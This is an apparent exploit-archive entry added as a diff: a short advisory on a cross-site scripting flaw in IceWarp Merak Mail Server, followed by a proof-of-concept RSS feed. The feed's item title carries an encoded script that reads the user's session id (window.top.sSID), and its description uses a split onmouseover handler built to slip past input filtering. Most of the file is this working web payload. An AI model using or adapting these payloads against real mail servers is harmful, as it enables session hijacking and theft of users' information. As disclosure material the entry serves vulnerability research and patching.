@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/34825/info
+
+IceWarp Merak Mail Server is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal potentially sensitive information and launch other attacks.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+<channel>
+    <title>RedTeam Pentesting</title>
+    <link
+      href="http://www.example.come"
+      rel="self"
+      type="application/rss+xml" />
+    <link>http://www.example.come</link>
+    <description>Seeing your network from the attacker&#039;s perspective</description>
+    <pubDate>Mon, 16 Apr 2009 05:23:42 +0000</pubDate>
+    <language>de</language>
+    <item>
+      <title>&lt;script&gt;alert(&#039;Title: Your session id is: &#039; +
+window.top.sSID);&lt;/script&gt;</title>
+      <link>http://www.example.come/pentest</link>
+      <pubDate>Mon, 16 Apr 2009 05:23:42 +0000</pubDate>
+      <description>
+        &lt;div o&lt;xml&gt;nmouseover=&quot;alert(&#039;Description: Your session id is: &#039; +
+window.top.sSID)&quot;&gt;
+          RedTeam Pentesting XSS
+        &lt;/div&gt;
+      </description>
+    </item>
+  </channel>
+</rss>
